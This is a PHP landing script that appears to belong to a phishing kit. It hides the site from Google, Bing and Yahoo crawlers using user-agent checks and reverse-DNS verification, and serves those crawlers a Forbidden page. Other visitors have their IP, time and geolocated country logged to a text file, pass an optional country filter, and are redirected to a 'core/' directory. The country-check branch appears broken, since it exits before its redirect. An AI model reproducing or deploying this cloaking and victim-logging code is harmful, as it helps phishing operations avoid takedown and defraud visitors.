<?php
require_once 'core/includes/main.php';

function botcheck(){
    $spiders = array(
      array('AdsBot-Google','google.com'),
      array('Googlebot','google.com'),
      array('Googlebot-Image','google.com'),
      array('Googlebot-Mobile','google.com'),
      array('Mediapartners','google.com'),
      array('Mediapartners-Google','google.com'),
      array('msnbot','search.msn.com'),
      array('bingbot','bing.com'),
      array('Slurp','help.yahoo.com'),
      array('Yahoo! Slurp','help.yahoo.com')
    );
    $useragent = strtolower($_SERVER['HTTP_USER_AGENT']);
    foreach($spiders as $bot) {
      if(preg_match("/$bot[0]/i",$useragent)){
        $ipaddress = $_SERVER['REMOTE_ADDR']; 
        $hostname = gethostbyaddr($ipaddress);
        $iphostname = gethostbyname($hostname);
        if (preg_match("/$bot[1]/i",$hostname) && $ipaddress == $iphostname){return true;}
      }
    }
   }


if(botcheck() == false) {
    // User Login - Read Cookie values
    session_start();
    include "core/configg.php";
    // require_once 'includes/main.php';
    include 'eradox/all.php';
    
    date_default_timezone_set('GMT');
    $TIME = date("d-m-Y H:i:s"); 
    $PP = getenv("REMOTE_ADDR");
    $J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
    $COUNTRY = $J7->geoplugin_countryName ;
    $ip = getenv("REMOTE_ADDR");
    $file = fopen("BORE3DA.txt","a");fwrite($file,$ip." - ".$TIME." - " . $COUNTRY ."\n") ;
    
    if($COUNTRy_Checker == "ON"){
        foreach ($allowed_Countries as $con) {
            if($COUNTRY){
                echo "CON: ".$COUNTRY;
                exit;
                if((in_array($COUNTRY, $allowed_Countries))){
                    header("Location: core/");
                    exit();
                }   
            }
            # code...
        }
    } else {
        header("Location: core/");
        exit();
    }
    
    
    
}
else {
$myfile = fopen("blocked.txt", "a") or die("Unable to open file!");
fwrite($myfile, $_SERVER['HTTP_USER_AGENT']."\n");
fclose($myfile);
}

include 'Forbidden/index.php';


?>